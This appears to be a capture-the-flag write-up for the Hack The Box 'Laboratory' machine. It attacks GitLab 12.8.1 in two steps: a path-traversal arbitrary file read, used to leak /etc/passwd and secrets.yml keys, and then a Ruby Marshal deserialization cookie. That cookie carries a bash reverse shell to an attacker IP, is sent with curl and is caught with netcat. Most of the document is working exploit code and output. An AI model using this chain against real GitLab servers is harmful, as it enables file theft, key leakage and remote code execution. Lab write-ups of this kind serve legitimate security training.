# git.laboratory.htb


![[Pasted image 20210424071508.png]]



*Created User napster *

![[Pasted image 20210424071805.png]]

* *After logging in with the created user enumerated the vesion of the gitlab-*

###  12.8.1

![[Pasted image 20210424072356.png]]

* *After Googling we came up with an interesting hacker one blogspot-*

### Link- https://hackerone.com/reports/827052

![[Pasted image 20210424073031.png]]

### Explaination -
```bash
### Steps to reproduce

1.  Create two projects
    
2.  Add an issue with the following description:

![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)


3.	Move the issue to the second project 


4. The file will have been copied to the project 

### Impact Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc

```


# Exploitation(LFI)-

* *Created two projects-*

![[Pasted image 20210424074423.png]]

* *Creating issue on the another project-*

![[Pasted image 20210424074731.png]]


![[Pasted image 20210424074946.png]]

* *Move the issue-*

![[Pasted image 20210424075206.png]]

* *And BOOM xD we can download the etc/passwd file-*

![[Pasted image 20210424075357.png]]


![[Pasted image 20210424075440.png]]

* *Content of /etc/passwd-*

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh

```

# Exploitation(LFI to RCE)-

The can be done by first grabbing the `secret_key_base` from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` using the arbitrary file read and then use the `experimentation_subject_id` cookie with a Marshalled payload.

====================================================================================================================================

* *Grabbing the `secret_key_base` from `/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml` using the above mentioned LFI*

![[Pasted image 20210424081500.png]]

![[Pasted image 20210424081927.png]]

* *secret_key_base- 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3*

```bash
production:
  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9d5ce620bc11838
  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3
  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0b84263903fd06af
  openid_connect_signing_key: |
  
  ```
  
  
  
  
 # Setting up Local Enviornment for Exploitation-
 
 * **apt install docker.io**
  * **docker run gitlab/gitlab-ce:12.8.1-ce.0**
  



  # Local Gitlab Instance-
  
  ## Change the secret_key_base to the above key,then restart gitlab & finally start gitlab console(ruby)-
  
  ```bash
  root@napster:~/Documents/HTB/Laboratory# docker ps
CONTAINER ID   IMAGE                          COMMAND             CREATED             STATUS                       PORTS                     NAMES
e883c6fc4138   gitlab/gitlab-ce:12.8.1-ce.0   "/assets/wrapper"   About an hour ago   Up About an hour (healthy)   22/tcp, 80/tcp, 443/tcp   compassionate_bouman
root@napster:~/Documents/HTB/Laboratory# docker exec -it e8 bash
root@e883c6fc4138:/# nano /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                                        
root@e883c6fc4138:/# gitlab-ctl restart
ok: run: alertmanager: (pid 2188) 1s                                                                                                                          
ok: run: gitaly: (pid 2203) 1s                                                                                                                                
ok: run: gitlab-exporter: (pid 2221) 0s                                                                                                                       
ok: run: gitlab-workhorse: (pid 2224) 0s                                                                                                                      
ok: run: grafana: (pid 2233) 0s                                                                                                                               
ok: run: logrotate: (pid 2249) 0s                                                                                                                             
ok: run: nginx: (pid 2269) 0s                                                                                                                                 
ok: run: postgres-exporter: (pid 2278) 1s                                                                                                                     
ok: run: postgresql: (pid 2290) 0s                                                                                                                            
ok: run: prometheus: (pid 2300) 1s                                                                                                                            
ok: run: redis: (pid 2314) 0s                                                                                                                                 
ok: run: redis-exporter: (pid 2319) 1s                                                                                                                        
ok: run: sidekiq: (pid 2328) 0s                                                                                                                               
ok: run: sshd: (pid 2411) 0s                                                                                                                                  
ok: run: unicorn: (pid 2419) 1s                                                                                                                               
root@e883c6fc4138:/# ls                                                                                                                                       
RELEASE  assets  bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var                                       
root@e883c6fc4138:/# gitlab-rails console                                                                                                                     
--------------------------------------------------------------------------------                                                                              
 GitLab:       12.8.1 (d18b43a5f5a) FOSS                                                                                                                      
 GitLab Shell: 11.0.0                                                                                                                                         
 PostgreSQL:   10.12                                                                                                                                          
--------------------------------------------------------------------------------                                                                              
Loading production environment (Rails 6.0.2)                                                                                                                  
irb(main):001:0>
  ```
  
  
  
  # Deserialized Payload and Reverse Shell-
  
  ```ruby
  request = ActionDispatch::Request.new(Rails.application.env_config)
request.env["action_dispatch.cookies_serializer"] = :marshal
cookies = request.cookie_jar

erb = ERB.new("<%= `bash -c 'bash -i >& /dev/tcp/10.10.14.12/9001 0>&1'` %>")
depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
cookies.signed[:cookie] = depr
puts cookies[:cookie]
BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLT
gKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6
DUVuY29kaW5nClVURi04BjsKRjoTQGZyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3Rpdm
VTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpU--e88eef22cb7e065db78ff6c5e61d63471fc66363
=> nil
irb(main):009:0> 
```
  
  ## Curling while litsening on netcat-
  
  ```bash
  root@napster:~/Documents/HTB/Laboratory# curl -vvv -k 'https://git.laboratory.htb/users/sign_in' -b "experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb[111/111$ByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kidSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91
dC48PCgoIGBiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEyLzkwMDEgMD4mMSdgICkudG9fcyk7IF9lcmJvdXQGOgZFRjoOQGVuY29kaW5nSXU6DUVuY29kaW5nClVURi04BjsKRjoTQG
Zyb3plbl9zdHJpbmcwOg5AZmlsZW5hbWUwOgxAbGluZW5vaQA6DEBtZXRob2Q6C3Jlc3VsdDoJQHZhckkiDEByZXN1bHQGOwpUOhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAG
OwpU--e88eef22cb7e065db78ff6c5e61d63471fc66363"
  ```
  
  ## Netcat-
  
  ```bash
  root@napster:~/Documents/HTB/Laboratory# nc -nvlp 9001                                                                                               [351/351]listening on [any] 9001 ...                                                                                                                                   
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.216] 46828                                                                                                  
bash: cannot set terminal process group (392): Inappropriate ioctl for device                                                                                 
bash: no job control in this shell                                                                                                                            
git@git:~/gitlab-rails/working$ which python3                                                                                                                 
which python3                                                                                                                                                 
/opt/gitlab/embedded/bin/python3                                                                                                                              
git@git:~/gitlab-rails/working$ python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                
<ing$ python3 -c 'import pty;pty.spawn("/bin/bash")'                                                                                                          
git@git:~/gitlab-rails/working$ ^Z                                                                                                                            
[1]+  Stopped                 nc -nvlp 9001                                                                                                                   
root@napster:~/Documents/HTB/Laboratory# stty raw -echo                        
root@napster:~/Documents/HTB/Laboratory# nc -nvlp 9001
git@git:~/gitlab-rails/working$ export TERM=xterm
git@git:~/gitlab-rails/working$ whoami
git
```